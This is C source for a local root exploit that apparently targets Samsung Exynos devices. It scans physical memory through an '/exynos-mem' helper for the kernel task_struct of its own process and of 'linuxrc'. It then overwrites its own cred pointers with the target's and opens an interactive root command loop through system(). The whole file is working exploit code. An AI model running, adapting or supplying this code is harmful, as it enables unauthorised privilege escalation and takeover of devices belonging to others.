#include <fcntl.h>
#include <inttypes.h>
#include <iso646.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#ifndef __arm__
    #include <sys/prctl.h>
#endif

#define EXYNOS_PATH "/exynos-mem"
#define PROCESS_NAME "FROGGY"
#define TARGET_PROCESS_NAME "linuxrc"
#define NEEDLE PROCESS_NAME

#define BUFF_SIZE 200000
#define COMMAND_MAX_LEN 100

#define PHYS_ADDR_START 0x60000000
#define PHYS_ADDR_END 0x87000000

#define MINIMUM_CRED_PTR PHYS_ADDR_START

#define READ_MODE 0
#define WRITE_MODE 1

#define LOG(fmt, ...) \
    printf("[?] "); \
    printf(fmt, ##__VA_ARGS__); \
    printf("\n"); \
    fflush(stdout);

#define WARN(fmt, ...) \
    printf("\x1b[34m[!] "); \
    printf(fmt, ##__VA_ARGS__); \
    printf("\x1b[0m\n"); \
    fflush(stdout);

#define SUCCESS(fmt, ...) \
    printf("\x1b[32m[+] "); \
    printf(fmt, ##__VA_ARGS__); \
    printf("\x1b[0m\n"); \
    fflush(stdout);

int exynos_phys_mem(uint8_t* buff, size_t addr, size_t amount, int mode) {
    char command[COMMAND_MAX_LEN] = {0};
    sprintf(command, "%s %zu %zu %d", EXYNOS_PATH, addr, amount, mode);
    // LOG("Running %s", command);

    FILE* exynos_pipe = NULL;
    if (mode == READ_MODE)
        exynos_pipe = popen(command, "r");
    else if (mode == WRITE_MODE)
        exynos_pipe = popen(command, "w");
    else
        WARN("Unexpected mode");

    if (exynos_pipe == NULL) {
        perror("popen failed");
        WARN("Popen failed");
        return 1;
    }

    if (mode == READ_MODE) {
        size_t bytes_read = fread(buff, sizeof(uint8_t), amount, exynos_pipe);
        if (amount != bytes_read) {
            WARN(
                "Expected to read %zu bytes, read %zu instead",
                amount,
                bytes_read
            );
        }
    } else {
        fwrite(buff, sizeof(uint8_t), amount, exynos_pipe);
    }

    pclose(exynos_pipe);
    return 0;
}

bool is_proc_comm(size_t addr, size_t* o_real_cred_addr, size_t* o_cred_addr) {
    LOG("Checking if? %zx is inside task_sturct", addr);
    uint8_t buff[20] = {0};
    int r = exynos_phys_mem(buff, addr - 8, 8, READ_MODE);
    uint32_t* real_cred_ptr = (uint32_t*)buff;
    uint32_t* cred_ptr = (uint32_t*)(buff + 4);
    if (*real_cred_ptr > MINIMUM_CRED_PTR && *cred_ptr > MINIMUM_CRED_PTR
        && *real_cred_ptr == *cred_ptr) {
        *o_real_cred_addr = *real_cred_ptr;
        *o_cred_addr = *real_cred_ptr;
        return true;
    }
    return false;
}

// Return the physical address of the process comm that matches the given proc_comm.
// Also sets the process's cred ptrs in the out parameters respectively.
size_t find_task_struct_creds(
    char* proc_comm,
    size_t proc_comm_len,
    size_t* o_real_cred_addr,
    size_t* o_cred_addr
) {
    size_t phys_addr = 0;
    uint8_t buf[BUFF_SIZE + 1] = {0};

    for (phys_addr = PHYS_ADDR_START; phys_addr < PHYS_ADDR_END;
         phys_addr += BUFF_SIZE) {
        int r = exynos_phys_mem(buf, phys_addr, BUFF_SIZE, READ_MODE);
        if (r != 0) {
            WARN("Reading phys mem did not succeed");
            return 1;
        }

        // subtruct 1 from proc_comm_len because we don't want to search the null-terminator
        uint8_t* result =
            (uint8_t*)memmem(buf, BUFF_SIZE, proc_comm, proc_comm_len - 1);
        if (result != NULL) {
            size_t needle_addr = phys_addr + (result - buf);
            SUCCESS("Found %s at phys addr %zx", proc_comm, needle_addr);
            if (is_proc_comm(needle_addr, o_real_cred_addr, o_cred_addr)) {
                SUCCESS(
                    "Found task_struct of %s, real_cred_addr=%zx, cred_addr=%zx",
                    proc_comm,
                    *o_real_cred_addr,
                    *o_cred_addr
                );
                return needle_addr;
            }
        }
    }
    return 0;
}

int main() {
    LOG("Starting exploit");
    prctl(15, PROCESS_NAME, 0, 0, 0);

    // Search for our (hijcaking) process
    char our_proc_name[] = PROCESS_NAME;
    size_t our_real_cred;
    size_t our_cred;

    size_t hijack_proc_comm_addr = find_task_struct_creds(
        our_proc_name,
        sizeof(our_proc_name),
        &our_real_cred,
        &our_cred
    );

    if (hijack_proc_comm_addr == 0) {
        WARN("Couldn't find task_sturct for process %s", our_proc_name);
        return 1;
    }

    // Search for target process
    char target_proc_name[] = TARGET_PROCESS_NAME;
    size_t target_real_cred;
    size_t target_cred;

    size_t target_proc_comm_addr = find_task_struct_creds(
        target_proc_name,
        sizeof(target_proc_name),
        &target_real_cred,
        &target_cred
    );

    if (target_proc_comm_addr == 0) {
        WARN("Couldn't find task_sturct for process %s", target_proc_name);
        return 1;
    }

    SUCCESS("Found task_sturct of both target and hijacking processes.");
    SUCCESS(
        "Hijacking process: %s, real_cred_addr=%zx, cred_addr=%zx",
        our_proc_name,
        our_real_cred,
        our_cred
    );
    SUCCESS(
        "Target process: %s, real_cred_addr=%zx, cred_addr=%zx",
        target_proc_name,
        target_real_cred,
        target_cred
    );

    size_t hijacking_real_cred_addr = hijack_proc_comm_addr - 8;
    size_t hijacking_cred_addr = hijack_proc_comm_addr - 4;

    exynos_phys_mem((uint8_t*)&target_cred, hijacking_cred_addr, 4, WRITE_MODE);
    exynos_phys_mem(
        (uint8_t*)&target_real_cred,
        hijacking_real_cred_addr,
        4,
        WRITE_MODE
    );
    system("ps -e");

    char command[100] = {0};
    int r = 0;
    while (1) {
        printf("$ ");
        fflush(stdout);
        r = read(0, command, 99);
        command[r] = '\0';
        if (strncmp(command, "Stop", 4) == 0)
            break;
        system(command);
    }
}
